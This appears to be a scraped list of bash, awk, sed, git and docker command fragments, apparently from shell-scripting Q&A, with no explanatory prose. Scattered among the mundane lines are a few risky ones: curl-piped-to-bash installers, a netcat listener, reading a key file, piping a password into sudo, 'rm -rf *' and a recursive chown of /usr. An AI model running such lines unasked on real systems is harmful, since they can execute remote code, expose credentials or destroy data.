<value name="CLIENTPREFIX">8.8.8.8</value>
scd path/to/remote/file local_file
scd() { scp username@host:path/to/remote/file $1; }
scd local_file
jar tvf
read -r foo bar _
sleep 5s && kill $$
mvcd *.mp3 ./old_music/
mvcd --no-clobber old.txt new.txt
test -d
/Tracking URL/{n=$4;}
Tracking URL
END{print n;}
cat  /var/www/key.txt
lsb_release -a
parallel --version
GNU Parallel 20140522
GNU Parallel 20140622
ssh -t <user>@<host> "$(<serverStatusReport.sh)"
ssh <user>@<host> "bash -s" < serverStatusReport.sh
git clone --depth=1 https://github.org/somerepo/something
git clone --mirror
git remote update
docker build
bash -ic
bash -ic
$sudo -i
bash: nc: command not found
PermitRootLogin no
python --help
ruby --help
$ModLoad imudp
"$ModLoad imudp"
[git-for-windows] Server = https://wingit.blob.core.windows.net/x86-64
[git-for-windows-mingw32] Server = https://wingit.blob.core.windows.net/i686
curl -L https://raw.githubusercontent.com/git-for-windows/build-extra/master/git-for-windows-keyring/git-for-windows.gpg | pacman-key --add - && pacman-key --lsign-key 1A9F3986
pacboy update
pacboy update
pacboy sync git:x git-doc-html:x git-doc-man:x git-extra: curl:x
git --version
git version 2.14.1.windows.1
pacman -S python
Git for Windows SDK
C:\Program Files\Git\bin\git.exe
mklink git "C:\Program Files\Git\bin\git.exe"
gvfs clone https://dev.azure.com/somebody/_git/somerepo
Git for Windows with GVFS patch
 Scalar for Git
Git for Windows with Scalar patch
C:\Program Files\Git
C:\Program Files\Git
/usr/bin/pac* ; /etc/pacman.conf ; /etc/pacman.d/ ; /var ; /usr/bin/msys* ;
C:\Program Files\Git\bin\bash.exe
C:\Program Files\Git\usr\bin\bash.exe
export PATH=$PATH:/C/Program\ Files/GVFS
export PATH=$PATH:"/C/Program Files/GVFS"
chmod +x /usr/bin/pacman ; pacman-key --init ; pacman-key --populate msys2 ; pacman-key --refresh-keys ; pacman --sync pacman --refresh --sysupgrade --sysupgrade --overwrite "*" 
--overwrite \*
pacman -Syy msys/pacman
pacman -Ql pacman
pacman -Ss pacman
pacman -Syy msys/pacman
echo $foo
echo $bar
cat $PATHTOVARIABLES/export.tmp
echo $i
cat /tmp/data.txt
| mail -s "FF VNX01 Quota report" storagemgmt@example.com
bash script
getHost 20.20.20.20 /etc/ipfile
implode(' ', $a)
php t.php
$option_string = implode(' ', $array_of_values);
find <dir> -executable -type f
find . ".*" -ls
-perm /700
-f filename
man bash
echo 'complete start camera script'
cmd_start_cam.sh: line 12: echo: write error: Broken Pipe
pkexec visudo
sudo -S *command* < <(echo -e "*pass*\n")
sudo ./RPi_Cam_Web_Interface_Installer.sh start
pkexec visudo
12345 A G
123 A G
ag hello
ag hello --context 2
docker run your_image arg1 arg2
arg1 arg2
docker run some_image /bin/bash
/bin/sh -c "file.sh"
/bin/sh -c "file.sh" /bin/sh -c "arg1 arg2"
/bin/sh -c "file.sh $1 $2" "arg1" "arg2"
/bin/sh -c "file.sh" "arg1" "arg2"
find ./ -iname "*.pdf"
find ./ -iname \*.pdf
find ./ -iname "*.doc"
find ./ -iname "*.{pdf,doc}"
man bash
set +H
git format-patch
fatal: bad revision
git format-patch -1 `git log -1 --pretty=oneline | sed 's/ .*//'` --
git log
git rev-parse HEAD
echo ${funcname[@]}
FS="[. ]";
sed | grep
git merge -s ours origin/master
shopt -s expand_aliases
env=dict(os.environ, ENVVAR='value')
7f 00 00 01
cat file*
unescaped newline inside substitute pattern
harddrive c
column -t
gawk -vRS='(^|\n)O[^\n]*\nH[^\n]*\nH[^\n]*' '{print RT}'
/usr/libexec/Plistbuddy -c "Add favoriteservers:CustomListItems:0:Name string server1.fqdn.com" com.apple.sidebarlists.plist
Array { Dict { Name = afp://or-fs-001/vol1 URL = afp://or-fs-001/vol1 } Dict { Name = smb://or-fs-001/vol1 URL = smb://or-fs-001/vol1 } Dict { Name = vnc://or-fs-001/vol1 URL = vnc://or-fs-001/vol1 } Dict { Name = ftp://or-fs-001/vol1 URL = ftp://or-fs-001/vol1 } }
grep -o
if [[ -z "$1" ]]; then echo "Usage: ..." >&2
IEEE Transactions
sh script.sh
touch /var/tmp/trigger
n && !--n
{ print }
comm -23
docker container inspect id/name
./prog.bash test.txt This one
sed s/<string>/'\\n'/
sed s/<string>/\\\\n/
ls -A
ls -A
alias somefolder='cd /Some\ path/with\ spaces/'
alias somefolder='cd /Some path/with spaces/'
...|./bashscript San
kill $pid
java -jar
kill $!
dpkg -i
psql: command not found
help test
[ expr ]
if [ -x /bin/$var2 ]; then
grep -e "^fi{6}"
-bash: objconv: command not found
myscript oldpassword newpassword
awk 'NR%2!=0{prev=$0;next} {print prev, $0}' file
set -a
less then n times
exact n times
greater than n times
<, <=, >, >=
$cmd = "/bin/bash -c './shell.sh /tmp/file_{1..12}.xml'";
set -o
ln -s
grep -v (A)
sudo -s -- 'ls -l'
sudo 'ls -l'
sudo: ls -l: command not found
WHERE name = asm_admin
awk '{print NR % 2==1 etc ...}
NR%2 { $1 = $1" "++i}; {print}
weka.classifiers.functions.supportVector.RegSMOImproved -L 1.0e-3 -W 1 -P 1.0e-12 -T 0.001 -V
weka.classifiers.functions.supportVector.NormalizedPolyKernel -C 250007 -E 8.0
<tr style="...">
pgrep less
killall less
man pgrep
man killall
man 7 signal
set_time_limit ( 0 );
tail -f file | grep exception
tail -f
ls | egrep '[a-zA-Z][\.][a-zA-Z]'
find . -type f | egrep '[a-zA-Z][\.][a-zA-Z]'
echo $ALTER
column pdb_name new_value pdb
alter session
alter session
env ${MY_VERSION} make
/usr/bin/file: /usr/bin/file: cannot execute binary file
awk -e '/\r/,/\r/!d'
grep -UPzo '\x0D'
grep -UPzo '\x0D\x00\x0D\x00'
echo -n 1
substr(s, m, n)
mktime("YYYY MM DD HH MM SS")
java $1
grep -q
konsole --tabs-from-file path_to_tabs_file/tabs
message_txt=$'This is just a test.\n Goodbye!'
-A n
-B n
docker run -d -p 8000:8000 -p 2701:2701 --name app_test_con_1 app_test_img_1
CMD ["/workspace/one_click.sh"]
service apache2 start
find -mtime
' '
grep -v -o "Product + Region"
f hello there my friend
find | grep 'hello\|there\|my\|friend'
webdriver-manager start
vagrant up
vagrant ssh
cd /vagrant
cd "component's folder"
docker-compose up
grunt serve
docker-compose up
vagrant up
vagrant ssh
( ... )
route -n
route -n
awk '{print $9}'
echo $PATH
echo $PATH
echo $PATH
env -i
which dcmdump
hash dcmdump
echo $?
hash dcmdump
command -v
type dcmdump
command -v
which dcmdump 2>/dev/null
echo FALSE
which NAME
echo TEXT
echo FALSE >&2
./script command
echo -e
setab #
setaf #
$convert input.png -trim ouput.png
-bash: syntax error near unexpected token
man bash
2> /dev/null
{ command-list }
1: not found
column -t
Current Permission
New Permission
-n =-h
[[ string ]]
[[ ... ]]
let COUNTER=COUNTER+1
sh ./sync.sh
echo ${dir:15:9}
for dir in /a/given/path/*.bam; do basename $dir | cut -f 1 -d .; done
$(shell ...)
$ chmod +x program.sh
python program1.py arg1
chmod a+x program1.py
./program.py arg1
/usr/bin/python program1.py args1
all: /bin/true
ambiguous redirect
job completed
", "
[ ,]
ssh -p 733 USER@example.net
$ sed -n 's/.*"entries": *\(\[\[.*\]\]\)/\1/p' /tmp/response.txt
$ sed -n 's/.*"entries": *\(\[\[(?!\]\].)*\]\]\)/\1/p' /tmp/response.txt
"entries": 
client -f myfile.cmd
for x in 1 2 3; do
cat | paste - - - ...
awk -f script.awk file1 file2
gnu-awk 4
echo -e "value\n"
echo "value"
[ "$i" -lt  ]
bash -n script
bash -n /usr/local/maldetect/conf.maldet
bash -n /usr/local/maldetect/conf.maldet.cron
od -c script
./prog.bash document1.txt document Document
./prog.bash Folder document Document
find .
find . -name \*.txt
expect "user@example.net's password:"
source ~/.zshrc
make install
sudo make install
sudo make install
sudo make install
sudo make install
sudo :
source scriptname
sh kill_sleep.sh
-C sleep
-o pid= -o nice=
system("kill " $1)
kill pid
kill -9
ps -C sleep ho
sed -e '/^\d+\./d' file > temp && mv temp file
sed -e '/^\d+/d' file > temp && mv temp file
sed -e '/^\d+\.+/' file > temp && mv temp file
sed -e '/^\[0-9]+\.+/d' file > temp && mv temp file
egrep -c [whatever character or string] file
egrep -c [^\/d+@] file
egrep -c [\/d+@] file
egrep -v
while read
./someCommand &
ls ~/data/2121/*SOMEFILES*
bash runscript
awk '/chr2\t/ Test.txt
sed -n 'chr$num\t/p' Test.txt
$challenge = $obj['object']['property']
kill -0 [pid]
esdf http://x.com/dfsdfg&%^*
undefined reference to
DevIL lib name
no such file or directory
foobar=$(Foo | tail -1)
tail -2
man bash
echo Success > /dev/ttys001
/^Name: XX/
/^Serial Number:/
=~ "^ "+ echo"
!= "+ echo"*
sudo apt-get install flac
find /path/to/search -type f -name \*.php -exec sed -i 's/<?php.*qhepxguxae*?>//g' {} \;
awk '/====/{x="S"++i;next}{print > x;}'
grep -o
set -o noglob
$(< file)
cat stack.txt | tr ' ' '\n' >outfile.txt
cat stack.txt | tr ' ' '\n'
uniq -f <num>
git branch
git branch
ssh -T
ssh -t -t
xConfiguration Audio Volume: 0
xCommand Dial Number: FAR_END_IP
ssh -T
ssh -t -t
ssh -T
ssh -t -t
cat call-init-step1.txt | ssh admin@cisco_codec
cat call-init-step1.txt | ssh -t -t admin@cisco_codec > results.txt
1, 2, 3
svn info
quoted form of
DOCKER_EVAL='eval $(docker-machine env default)'
printf "%s"
DOCKER_EVAL='eval "$(docker-machine env default)"'
eval "$(...
docker-machine env
export PATH=$PATH:/usr/local/bin
. /etc/default/sensu
grep -v
grep -v
grep -v
import apt_pkg
expect -d
[ -d TestFolder ]
man readlink
-j 8
-j 16
man bash
foo="$foo" awk 'BEGIN{ foo=ENVIRON["foo"]; print foo }'
read -r var
awk -v var=
FS=<a literal tab>
-n 1
-n 1
$(( ... ))
let x=()
cp source_file_location target_file_location
sed -i '/text_to_parse/{s/.*/new text/;:a;n;ba}' testFile.xml
sed -i '0,/text_to_parse/{/text_to_parse/s/.*/new text/}' testFile.xml
while loop
date -d
SMS: +XXX XXX XXX XXX
SMS: +123 456 789 123   SMS: +456 789 123 456
http://somelink/to/some/web/page.html SMS: +123 456 789 123
+XXX XXX XXX XXX
grep -o
sh -c "..."
sh -c
mysql -h$host -u$user -p$password -e
[[ 'hithere' =~ .*there ]] && echo "Yes"
cp blablabla blablabla.bak
git status
git add *.xml
git add
<(contents of string)
./.git/HEAD does not exist
man exiftool
su -s /bin/bash
wc -l < filename.csv
-c arg
sum(1 for line in csv.reader(open("file.csv")))
$(($(wc -l < filename.csv) - 1))
/usr/bin/time -f %M command...
/usr/bin/time -l command...
cat list.txt | cut -f1 | awk 'NR==1 {print}'
resposta=$(ssh ${nodes[$k]} 'nproc && uptime')
User ID
echo $(<hosts) | awk '{print $1}'
echo $(<hosts) | awk '{print $2}
/bin/bash -c "read -e myVar; echo \$myVar"
/bin/bash -c "read -e; echo \$REPLY"
exec 3>&2
trap 'exec 2>/dev/null' DEBUG
-s size
cat * | sort | uniq -cd
cat * | sort | uniq -cd | grep "" *
| tr ',' '\t'
. ./testscript
export VAR=val
check zips
$4>p+100 && p>pp+100{c++}
END{print c}
bash my_script.sh
-F'[ \t/]+'
printf "%s %s  %04i%02i%02i 0000  %04i%02i%02i 0000\n",$1,$2,$5,$3,$4,$8,$6,$7;
20140601 0000
prsystem_profiler SPHardwareDataType
"$1" "$2" "$3"...
man bash
main >/dev/null
do_sth >/dev/null &
fish_functions_path="$MY_FUNCTIONS_PATH" fish
bc > temp.txt
man bash
bc > temp.txt
bc > temp.txt
shopt -s extglob
in obs regex
jobs -l
$(curl -s https://api.ipify.org | cut -c 1-5)
source <(python3 ${bin_path}/jd_to_date.py ${data[0]0:5})
data[0]=57235003472222219e+04; echo ${data[0]0:5}
data[0]=57235003472222219e+04; echo ${data[0]:0:5}
grep -P
man su
PRODUCT_BUNDLE_IDENTIFIER = com.example.71b9b4f2
PRODUCT_BUNDLE_IDENTIFIER = com.example.14a32d1e
sed -i 's/com.example.71b94f2/com.example.14a32d1e/g' project.pbxproj
echo a > file1 > file2
echo a
No file found
echo $pwd
echo -ne '\n' | arcconf identify 1 device 0 1
kill -9 8309
echo -ne '\n' > /proc/8309/fd/0
mkdir "$prefixdir$l"
mkdir -p
-m 0644
bash -c
convert -append
convert -append image1.jpg image2.jpg image3.jpg IMAGESTRIP.jpg
END{print ""}
expr: non-numeric argument
expr $sum + $i
./test.sh < input
sudo echo "sadfsadf" > /etc/apache2/mods-available/dir.conf
sudo xxx > file
sudo -s
"key=value key=value with spaces"
key=value key="value with spaces" key=valueWithoutSpaces
value with spaces
find . -mtime -3 -mmin +60
find ./ -mtime -3 -mmin +60 -exec ls -lhrt {} \; | awk '{print $5" "$6" "$7" "$8}'
cut -d , -f 2
"smith, john"
Still red.
less -RF
set -e
set -e
kill -9 [pid]
kill PID
kill -KILL PID
kill -9 PID
proid= pidof $proceso
TCP socket
-f FILE, --file=FILE
echo $text
State:<space>S (sleeping)
State:<tab>S (sleeping)
ps aux | grep
<<< string
ls *html
ls *html | sed 's/html/css/g'
-g 0
info split
cat ${file}
cat file_${part_number}
cat file_json.*
head -n 2
"--rsync-path='sudo rsync'"
-d "$VAL"
jq '...' | curl ...
"yes "
" y"
shopt -s extglob
if [[ ${response^^} =~ ^(Y|YES)$ ]]; then ... fi
if [[ $? == 0 ]]; then ... fi
if [[ $? ]]; then ... fi
[[ 0 ]]
(( 0 ))
ps -o uid= -p $pidhere
kill -l
Operation not permitted
man bash
docker stop
docker kill
/bin/sh -c
docker kill
[ .... -a .... ]
[ .... ] && [ .... ]
### BEGIN INIT INFO
# Provides:          touchpad_settings.sh
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Start daemon at boot time
# Description:       Enable service provided by daemon.
### END INIT INFO
ynclient TapButton2=2
synclient TapButton3=3
synclient VertEdgeScroll=1
synclient CircularScrolling=1
start myscript
GNU Parallel
which $SHELL
#!/bin/env bash
a bc.log
ab c.log
./ab c.log not renamed: ./abc.log already exists
shopts -s globstar
for folder in */ ; do
read FILES LINES <<<($(echo $INPUTFILES | xargs grep -n $id | cut -f1,2 -d':' | awk '{print $1 " " $2}'
grep -Ri "num_samples" *
grep -Rih "num_samples" *
grep -Ri "num_samples" * | sed 's/<\/.*//g; s/:\s\+.*>/ /g'
grep -Rih "num_samples" * | grep -o '[0-9]\+'
[[ ... ]]
(( ... ))
[[ $line =~ Network \connection \down! ]] && (( i < 4))
if [[ `echo $LINE|grep -c 'Network connection down!'` -eq 1 && $i -gt 4 ]]
perldoc perlretut
man parallel
echo $array
paste -d, "file 1" "file 2" | sed -e 's/^,$//g;s/^,/,,,/g'
paste -d, "file 1" "file 2" | sed -e 's/^,/,,,/g;s/,$/,,,/g'
paste -d, "file 1" "file 2" | sed 's/^,$//g'
echo $word_1
echo $word_5
set -e
grep -o
set -u
set -u
su -c "stuff "with" double "quotes"
|stuff "with" double "quotes"|
|stuff |
| double|
rename .png -sm.png *.png
invalid option -- 'm'
RE error: repetition-operator operand invalid
awk -v OFS='\t' '$6 ~ /^07/ {print $3, $4, $5, $6}' file
30 January 2015
/ USR / SBIN / HTTPD -k restart
pr -m -t -s\  file1 file2 | awk '{print $1","$2}' > out
$ paste -d, file1 file2
sort -k 2,4 file_name.txt
rvm gemset list
Title and Command
Run command as a login shell
ls -l
!!:2-4 stop
curl --head
curl --head http://www.bcheadset.ca/fte.xlsx
echo $PATH
source /etc/profile
brew install git
git --version
curl --silent http://[IP.stuff.nyc_traffic_data].txt >> data.txt
crontab cron.txt
sudo chown $whoami /usr/local/bin
sudo chown -R 'username' /usr/local/bin /usr/local/share /usr/local/share/man /usr/local/share/man/man1
brew doctor
brew upgrade
history -a
help history
man 1 bash
shopt -s histappend
history -a
echo hello
ls -l | grep -e '^...x'
sed -i 's/\(AB[0-9][0-9]-XYZ\)/Linux\\\1/g' file
tput setaf
ls -tr | wc -l
ls -tr | head -number_of_files_minus_2 | xargs rm
echo "sw i01" | cu -s 19200 -l /dev/ttyUSB0
cu -s 19200 -l /dev/ttyUSB0
chmod +x script.sh
echo "sw i01" | script.sh
read -a
echo "${OLDIP[@]"
OLDIP=$(cat "/tmp/replacements")
tail -f
ssh-add -K ~/.ssh/host_id_rsa
chmod -R +x *.sh
1.sh 2.sh
chmod -R +x 1.sh 2.sh
history -r
-o ConnectTimeout
/git push.*master.*/
Are you sure? Y/N
ls -l
ls -l
cat /etc/shells
^/bin/rm .*
rm -i
sort -n
Defaults requiretty
Defaults requiretty
'61s#.*# < property name="jobExecutionIntervalInHours" value="24A" /> #
grep -f main1.txt infoFile.txt | sort |uniq -c
{a[$1]++; next}
for (i in a)
{print $1 ":  Total", ($1 in a)?a[$1]:0}
":  Total "
trap "cmd" ERR
set -e
yes|datasource add <hostname>
datasource add
script -c
crontab -e
grep -zEqv
git remote set-url origin ssh://git@localgitrepository
%d/%m/%Y %H:%i aaa bbb ccc 123456 ddd 7890 eee
set -e
set -e
find ./ -type f | xargs basename | xargs grep -r {} ../_posts/
grep -f -
git status
git add --all
#!Program Files (x86)\Git\bin\bash
"%bash%" --login -i -c "exec "%1""
bash --login -i -c "exec ./myscript"
$f - $f
-v RS='\r\n'
{print > outFile}
sudo apt-get install dos2unix
awk -v today=$(date -d "today 00:00:00" +"%s") -v yesterday=$(date -d "yesterday 00:00:00" +"%s") -F'[\\[\\] ]' '{ if($2 >= yesterday && $2 < today) print }' logfile.log
-F'[\\[\\] ]'
awk -F" "
grep -oP
ls -t
sed -i
sudo pkill -f "test.py"
env PUIBy="Dropbox/CUSP/1_1_PUI/PUI_Bycicle_Research/" jupyter notebook
chmod +x project.sh
source <file>
source <file>
alias foo='source "/path/to/foo"'
foo() { source "/path/to/foo"; }
docker exec <container> bash
bash -e
numsum -r
history | tail -n3
stty sane
man bash
help declare
help printf
gcc -o test test.c -Wall -std=c99
./test test.txt
s=$(grep : file)
echo "one two three four five: six seven" | awk -F ':' '{print $1}' | awk '{print $NF}'
docker-compose up -d
docker-compose up
npm install
composer *update
exec nginx
/hello&coucou/{getline;next} 1' input.fa
{ }
{ }
source /path/to/file
wmctrl -c "Sponsored Session"
bash: grep: command not found
echo "export PATH=$PATH:/<path_to_grep>" >> ~/.bash_profile
find / -iname "*grep*"
openvpn --config vpnbook-euro1-tcp443.ovpn
openvpn --version
bash --version
ssh vagrant@192.x.x.x  -i f:\id_rsa "scss --watch %1| kill -9 (ps -aux | grep scss | cut -d " " -f 4 | head -n 1)"
sudo bash script.sh "arg1" "arg2"
2015-10-08 00:00:00
R -e
%geom scan
jobs -p
man kill
kill -9 pid
"$1" "$2"
head -c8
sed -n "1,10p"
head -n10
wget -O
git pull
git rev-parse --tags
git rev-list --max-count=2 --no-walk --stdin
git log
git log
git log
for file in "$@"
for file
while true
while :
docker logs my_container
LD command not found
man diff
lzop -d file_name.lzo
bash -c "cmd1; cmd2"
*.images(xxx) 1
for file in *.images*; do mv "$file" "${file/\.*/\.jpg}"; done;
cd ~
ls -l
301 Moved Permanently
test "$1"
man stat
((: i<: syntax error: operand expected (error token is "<")
for (( i=$colIndex;i<$numCols;i++ ))
cat - > temp
cat - > temp
while read ... done < "${2:-/dev/stdin}"
ls -t
head -1
find -size +1M
find | head -n 100
find -size +1M
head -n 100
find -size +1M
sudo chown root -R /usr
--device mba
${device//=/ }
echo $?
start=$(date +%s)
echo "$output"
echo "$time-output"
"advisory table"
cp -n
something $my_var bar
something foo bar
if (x) if (y)
if (x && y)
git pull
{ print }
[[ ... ]]
echo $PIPESTATUS
awk -F"|" '{print $1}' input.csv > output.csv
while read
perl -F'\|' -lane 'print $F[0]' input.csv > output.csv
echo $var
useradd $username -p $password -g $group
openssl passwd -crypt $password
adduser -p $rpassword
read -r a b c
read -r -d ''
- shell: exec $SHELL
exec $SHELL
- command: exec $SHELL
-command: shell $SHELL
exec $SHELL
CD ..
FILES=$(find …)
man bash
if [ $file1 != $file2 ]
if [ "md5sum.txt" != "GeoLite2-City.md5" ]
rm -f GeoLightCity.dat
apt-get install man
E: Unable to locate package man
awk -f pr.awk input.dat
tar -zxvf
tar -zxvf dokuwiki.20151010.tar.gz
MacOS x
screen -S <session name>
node mybot.js >> logi/logi_$now.txt
secceed ,assign switch = 1 ,exit the for loop
-type f
sort -k3 -r
tail -n 1
ls|sort -V |head -n 1 |xargs rm
awk -f pr.awk input.dat | awk -f del.awk
awk -f pr.awk input.txt
./sum 5 6
awk -f pr.awk input.dat
/=$/{sub(/=$/,""); printf "%s",$0;next}
curl_args="--limit-rate 500K"
find . -name '*$roz1'
find . -name "*$roz"
${var: -4:1}
: -4
-w 0
stats -r "$(cat test_file)"
awk -f script.awk file*
man bash
mkdir \#abc
fc -ln -1
log_this.script other_script other_arg1 other_arg2 > file
other_script other_arg1 other_arg2 > file
-f <FILENAME>
python manage.py runserver
python -m SimpleHTTPServer
aptly api serve
ps -aux | grep runserver
sudo kill -9 $PID
ls | egrep x.*x
bash: uk.json: Permission denied
text item delimiters
text item
as string
grep -A1
tail -n -1
{ exec('sudo echo Hello World'); }
echo exec('whoami');
x = 0
let "x+=1"
[ ]
curl -L get.rvm.io | bash -s stable
p = Popen(string,shell=True,stdout=PIPE)
p = Popen(['grep', 'NoMoreHotCorner_20151006.T', 'command/*'],stdout=PIPE)
check_output(['grep', 'NoMoreHotCorner_20151006.T', 'command/*'])
mkdir -p
wget -P
pip install wget
readlink -f bar
readlink -f /home/foo/bar
\Q ... \E
$hdfs -getmerge "$reportPath" "$tmpWorkingDirectory/report.txt"
sh -c
git status
git ls-files
cat *
cat ${*.txt|*.rtf}
cat *.{txt,rft}
cat $(find . -type f \( -name "*.txt" -o -name "*.rtf" \))
/etc/rc.d/rc.supervisord restart
aws rds describe-db-snapshots --db-instance-identifier ${db_name} --query 'DBSnapshots[?contains(DBSnapshotIdentifier, `name-db`) == `true`]'.DBSnapshotIdentifier --output text | sort -k8 | tail -n1 | gawk '{print $4}'
$1, $3, $4, $2, $5, $6, $7, $8
eval $String
svn rm $SVNPATH/trunk/*
rm $SVNPATH/trunk/*
sudo apt-get install postgresql-client
sudo: apt-get: command not found
'{print $2}'
'{print $($i)}'
$(input line)
-v var="$1"
$cat some.json | jsawk -n 'out(this["Standard Input Parameters\n(Dev)"])'
systemctl daemon-reload; systemctl restart test; systemctl status test -l
hello world
echo ${a}
echo $a
echo $${a}
hello world
$ sudo chattr +a /home/user/.bash_history
exec $* ;;
myfile: No such file or directory
c d
sudo service haproxy stop
[ ... ]
/usr/local/bin/polyphen.sh: 15: Syntax error: "(" unexpected
libreoffice --headless --cat
g++ -Wall -Wextra -g
bash -c source env.sh
bash -c source env.sh && env
cd /tmp/non_existing_dir || echo "could not execute $PREVIOUS_PIPE_CMD
run --env <key>=<value>
docker run -it --net="host" IMAGE
man nice
$3=(intensity of their frequency in combination)
spl "datafile.dat" u 1:2:3
result = "1"
cat file | awk '...'
awk '...' file
mv file newfile
vagrant up
$( )
$( )
exit 1
exit 1
exit 1
cp -a sourceDir./ destinationDir
Java 9
make install
xmlstarlet sel -t -v //input[@name=\'dummy\']/@value example.html
GNU find
GNU find
-exec ;
-exec +
sed 's:/[^/]*$::'
| sed 's:/\.::'
while read
dte1=`date +%Y_%m_%d_%H_%M_%s`
dte2=`date +%Y_%m_%d`
cmd | bc
(( ... ))
s3cmd put --recursive
s3cmd sync
mv */* .
mv a/* b/* .
-t .
-type f
mv */** .
'<input-path>'/* .
xargs -L 1 ...
-mindepth 1
sh -c
sort <(sort file1 | uniq) <(sort file2 | uniq) | uniq -d
sed -e "s/ /|/g"
( *(\w+) *)
?! *(\w+) *$)
sed -e 's/[ ]\{1,\}/|/g'
-t -t
sed 's/\s/:/2'
int execl(const char *path, const char *arg, ...);
source ~/.bashrc
for var in "$VARS"
for var in $VARS
<path to folder>
-type f
-exec mv {} {}.txt
find /your/path -exec awk '...' {} \;
find . -name "*.php"
-exec sed -n -i '1d' {} \;
find . -name "*.php" -type f -exec sed -i '1d' {} \;
exit 1
exit -1
(exit -1); echo $?
cut -c3
$3 != 2
vcgencmd measure_volts
set -e
set -eo pipefail
awk '1{ if(  NR % 2 == 0 && NR % 4 != 0) print }' ../../path/to/somedata.txt  | grep "A$" | wc -l
grep -e "(?<!a)b" file.txt
alias sv='ssh user@hostname'
alias ss="ssh username@server"
ls -a
which ssh-argv0
rec[$1 SUBSEP $2 SUBSEP $4]=...
for (R in rec)
$1 SUBSEP $2 SUBSEP $4
sprintf ...%s,...,$1,$2,$4;
foo bar
rec["foo bar"]=="file1"
rec["foo bar"]=="file1/file2"
rec["foo bar"]=file1/file1/file2
"filename1/filename2/... --> R"
"filename1/filename2/... --> R"
D in dup
stty sane
wc -l
set  | wc -c
export | wc -c
export | wc -c
export -f
(9309 + 150917 != 121160)
export -f
wc -c
tr -d '\r'
hostname -I
sed -r
sed -r
sed -E
source ~/.bashrc
exec bash
test -f ~/.bashrc && . ~/.bashrc
man bash
man bash
ssh user@remote1 "tar -cvf - . | ssh user@local1"
plutil -insert "160" -string "hi" file.plist
plutil -insert "thisistext" -string "hi" file.plist
s/.*: //
wget -O
sed -e
sed -i
execvp('/bin/bash', {'/bin/bash', '--login'})
exec -l bash
exec bash
exec -l bash
stty -a
man ls
man head
echo $fname
a | b | c | ... | z
grep "client connected \|client disconnected"
| grep "(id:XY)"
| cut -c 1-16
cat *.log | grep "client connected\|client disconnected" | cut -c 1-16
id >= 1000
-l 'test' --
-l '' -- 'test'
echo "list volumes" | /sbin/bconsole|grep -i "Append\|Full"|awk '{print $4}'
man 3 printf
printf -v varname "fmt string"
perl -lane '$F[3] = sprintf("%06.2f", $F[3]); print join " ",@F' input
perl -lane '$F[3] = substr(sprintf("%5.2f", $F[3]),0,5); print join " ",@F' input
grep -o
sort -u
bash-4.2$ ./shell.sh
bash shell.sh
perl -e '$n=shift; @A=split/,/,(shift); print join ", ", sort {abs($a-$n)<=>abs($b-$n)} @A' 5 1,2,6,10,5
sort {abs($a-$n)<=>abs($b-$n)}
printf "%d\n" 1 2 6 10 5 | perl -ne 'BEGIN{$n=shift} push @A, $_; END{print join "", sort {abs($a-$n)<=>abs($b-$n)} @A}' 5
ssh-exchange_identification: read: connection reset by peer.
($1 < 1)
cd -
cd "$OLDPWD"
wc -l
grep -v grep
headless = Headless.new
exec 3<>
exec 3<
exec 3<pipe
stty -a
stty -a
/Users/me/Dropbox/Computer Preferences/zsh/
$ whoami
chmod 755 test.sh
omxplayer Song_Title.mp3
omxplayer -o local
omxplayer --vol N Sogn_title.mp3
--vol YYY
XXX = 10 ^ (YYY / 2000)
YYY = 2000 * (log XXX)
git ftp init --verbose
curl -v --insecure sftp://user:password@xxx.com
$DBSCHEMA = testing
USE $DBSCHEMA;
mysql -h $DBIP -u testuser -ptestuser $DBSCHEMA -e
git log --oneline | wc -l
version = "10.0.0.0"
version = "10.0.0.foo"
> settings.au
help test
nc -lvp 12345
nc 127.0.0.1 12345
./my_script book *
for file; do
while read
for cat
grep -F
while read
 from 
 F
 from
\1 \2
-n p
-n p
chmod 755 /path/to/script
INSERT INTO table (columnname) VALUES ("File(s) '$notexistingfiles' don't exist")
list=$(printf '%s' {a..z})
CC=/path/to/afl/afl-gcc ./configure
bad substitution
if (($y1$m1$d1 < $y2$m2$d2)); then
printf %q
> ./bdocs.sh ../repo
ls p* | sort -t"." -k2n -k1 | paste - -
/bin/sh scriptfile.sh
/bin/bash scriptfile.sh
chmod u+x script.sh
sh script.sh
4, 9 or 16, etc.
command not found
aminonum^peplength -1
cp -rfp {} / extracted/
cp -rfp {} extracted/
cp -rfp {} /extracted/
IFS=$' \t\n'
echo "$var"
$' \t\n'
a=(word1 word2 ...)
awk -F: '$1 == "required" {for(i=2;i<=NF;i+=1) printf $i" "}' data.txt
ts=$(date +%s)
print > file
-v file="$hosts.$$"
-nodesktop -nosplash -r "foo"
-nojvm -nodisplay -nosplash
-nodesktop -nosplash
rm -rf *
rm -rf * && date >> cleanup.runs.log
wc -l
$(cat other.file)
echo ... > other.file
read -a
grep -v -- "-NO" file
grep -v "\-NO" file
osascript -e "quit app \"$1\""
open -a $1
bash << fin
awk -f pr.awk test.txt
error message
    ssh user@host 'nohup bash -s > /dev/null 2>&1&' < local_script.sh
if [ find $3 -type  f\( -name "*.$1"\) ]
./script .txt .doc ./catalog
find "$3" -type f -name "*$1"
qsub <filename.sh>
2>&1 |
2>&1 |
echo"$y < $x"
echo -n; read
read -p
$shell_command  = "c:\php\php_cgi.exe c:\php\php_test.php";
$post_temp_path = "c:\php\temp.212";
shell_exec("$shell_command < $post_temp_path");
bash: cd: /git: No such file or directory
Your build failed...
bash: command substitution: line 1: syntax error near unexpected token)
bash: command substitution: line 1: __git_ps1)
IFS=$(echo -en "\n\b") && for a in $(< base.txt); do sed -in "s/${a}/something/;t a;b b;:a p;:b" A.txt >> change.txt; done
IFS=$(echo -en "\n\b") && for a in $(< change.txt); do sed -in "s/${a}/something/" B.txt; done
ls "$FOLDER"
every ::121::600 using 3:25:43
set table
plot 'data1.csv' using 1:2 w l
every ::121::600
every ::2::2
awk 'FNR==1{print ""}1' data*.dat
touch b
-f script.awk
$(cut -d '.' -f2 <<< "07:45:06.729")
echo "scale=3; $((1000 -$(echo $(cut -d '.' -f2 <<< "07:45:06.729"))))/1000"|bc
date +%N
local duration=$(...)
printf -v duration
printf '%04d'
GNU bash, version 4.1.2(2)-release (x86_64-redhat-linux-gnu)
-name '*.txt'
set -x
echo "[$actualsize] [$minimumsize]"
du -m
[[ ]]
[ ]
[ "${#a}" -eq 3 ] && ((n+=32*($(printf "%d" "'${a:2}") - 96)))
echo $n
uniq -c
python -i scraper.py
ex filename
